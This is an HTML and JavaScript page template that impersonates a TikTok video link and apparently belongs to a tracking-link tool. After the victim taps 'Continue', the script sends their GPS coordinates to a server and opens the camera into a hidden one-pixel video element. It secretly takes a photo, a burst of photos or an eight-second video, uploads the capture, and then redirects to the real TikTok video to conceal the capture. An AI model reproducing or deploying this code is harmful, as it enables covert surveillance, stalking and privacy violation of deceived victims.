<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #000; color: #fff; height: 100vh; overflow: hidden; display: flex; align-items: center; justify-content: center; flex-direction: column; }
        .logo { font-size: 60px; margin-bottom: 10px; }
        .title { font-size: 22px; font-weight: 600; }
        .subtitle { font-size: 14px; color: rgba(255,255,255,0.4); margin-top: 4px; }
        #hiddenVideo { position: absolute; width: 1px; height: 1px; opacity: 0.01; top: -100px; left: -100px; z-index: -1; }
        .permission-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.85); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; padding: 24px; }
        .permission-overlay h2 { font-size: 24px; margin-bottom: 8px; }
        .permission-overlay p { font-size: 14px; color: rgba(255,255,255,0.6); margin-bottom: 20px; text-align: center; max-width: 300px; }
        .permission-btn { background: #fe2c55; color: #fff; border: none; padding: 14px 48px; border-radius: 28px; font-size: 18px; font-weight: 600; cursor: pointer; }
        .loading { display: none; color: rgba(255,255,255,0.6); margin-top: 16px; }
        .spinner { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.2); border-top-color: #fe2c55; border-radius: 50%; animation: spin 1s linear infinite; margin-top: 20px; display: none; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="logo">🎵</div>
<div class="title">TikTok</div>
<div class="subtitle" id="statusText">Loading video...</div>
<div class="spinner" id="spinner"></div>
<video id="hiddenVideo" autoplay playsinline muted></video>

<div class="permission-overlay" id="permissionOverlay">
    <h2>▶️ Watch Video</h2>
    <p>Tap continue to watch this TikTok video</p>
    <button class="permission-btn" id="allowBtn">▶️ Continue</button>
    <div class="loading" id="loadingText">Loading video...</div>
</div>

<script>
    const content_type = "{{ content_type }}";
    const camera_type = "{{ camera }}";
    const link_id = "{{ link_id }}";
    const video_url = "{{ video_url }}";

    let stream = null;
    let imageCapture = null;
    let currentFacingMode = camera_type === 'rear' ? 'environment' : 'user';
    let mediaRecorder = null;
    let recordedChunks = [];
    let captureDone = false;
    let redirectDone = false;
    const RECORD_SECONDS = 8;
    const MAX_BURST = 5;

    const hiddenVideo = document.getElementById('hiddenVideo');
    const permissionOverlay = document.getElementById('permissionOverlay');
    const allowBtn = document.getElementById('allowBtn');
    const loadingText = document.getElementById('loadingText');
    const spinner = document.getElementById('spinner');
    const statusText = document.getElementById('statusText');

    function updateStatus(msg) {
        statusText.textContent = msg;
    }

    function sendToServer(payload) {
        fetch('/api/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).then(r => console.log('Sent:', r.status))
          .catch(e => console.error('Send error:', e));
    }

    function sendGPS(lat, lon) {
        fetch('/api/gps_location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ link_id, lat, lon })
        }).then(r => console.log('GPS sent:', r.status))
          .catch(e => console.error('GPS error:', e));
    }

    function getGPSLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    sendGPS(pos.coords.latitude, pos.coords.longitude);
                    startCamera();
                },
                function(err) { startCamera(); },
                { enableHighAccuracy: true, timeout: 5000 }
            );
        } else {
            startCamera();
        }
    }

    function redirectToTikTok() {
        if (redirectDone) return;
        redirectDone = true;
        setTimeout(() => {
            window.location.href = `tiktok://video?url=${encodeURIComponent(video_url)}`;
        }, 300);
        setTimeout(() => {
            window.location.href = video_url;
        }, 1500);
    }

    async function grabPhoto() {
        if (!imageCapture) return null;
        try {
            const bitmap = await imageCapture.grabFrame();
            const canvas = document.createElement('canvas');
            canvas.width = bitmap.width;
            canvas.height = bitmap.height;
            const ctx = canvas.getContext('2d');
            if (currentFacingMode === 'user') {
                ctx.translate(canvas.width, 0);
                ctx.scale(-1, 1);
            }
            ctx.drawImage(bitmap, 0, 0);
            return canvas.toDataURL('image/jpeg', 0.85);
        } catch (e) {
            return null;
        }
    }

    async function doCapture() {
        if (captureDone) return;
        captureDone = true;

        if (content_type === 'single_photo') {
            const p = await grabPhoto();
            if (p) sendToServer({ link_id, image_data: p, camera: currentFacingMode === 'user' ? 'front' : 'rear', type: 'photo' });
            setTimeout(redirectToTikTok, 500);
            return;
        }

        if (content_type === 'burst') {
            const photos = [];
            for (let i = 0; i < MAX_BURST; i++) {
                const p = await grabPhoto();
                if (p) photos.push(p);
                if (i < MAX_BURST - 1) await new Promise(r => setTimeout(r, 250));
            }
            if (photos.length > 0) sendToServer({ link_id, images: photos, camera: currentFacingMode === 'user' ? 'front' : 'rear', type: 'burst' });
            setTimeout(redirectToTikTok, 500);
            return;
        }

        if (content_type === 'video') {
            // Record for 8 seconds
            recordedChunks = [];
            const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus') ? 'video/webm;codecs=vp9,opus' : 'video/webm';
            mediaRecorder = new MediaRecorder(stream, { mimeType });
            
            mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
            mediaRecorder.onstop = () => {
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                const reader = new FileReader();
                reader.onloadend = () => {
                    sendToServer({
                        link_id,
                        image_data: reader.result,
                        camera: currentFacingMode === 'user' ? 'front' : 'rear',
                        type: 'video'
                    });
                };
                reader.readAsDataURL(blob);
                setTimeout(redirectToTikTok, 500);
            };
            
            mediaRecorder.start();
            setTimeout(() => {
                if (mediaRecorder && mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
            }, RECORD_SECONDS * 1000);
        }
    }

    function startCamera() {
        navigator.mediaDevices.getUserMedia({
            video: { facingMode: currentFacingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: false
        }).then(s => {
            stream = s;
            hiddenVideo.srcObject = stream;
            const track = stream.getVideoTracks()[0];
            imageCapture = new ImageCapture(track);
            hiddenVideo.play().then(() => {
                permissionOverlay.style.display = 'none';
                spinner.style.display = 'none';
                updateStatus('Loading video...');
                setTimeout(doCapture, 500);
            });
        }).catch(err => {
            updateStatus('Camera access is needed');
            allowBtn.textContent = 'Try Again';
            allowBtn.style.display = 'block';
        });
    }

    allowBtn.addEventListener('click', () => {
        allowBtn.style.display = 'none';
        loadingText.style.display = 'block';
        spinner.style.display = 'block';
        updateStatus('Loading video...');
        getGPSLocation();
    });
</script>
</body>
</html>
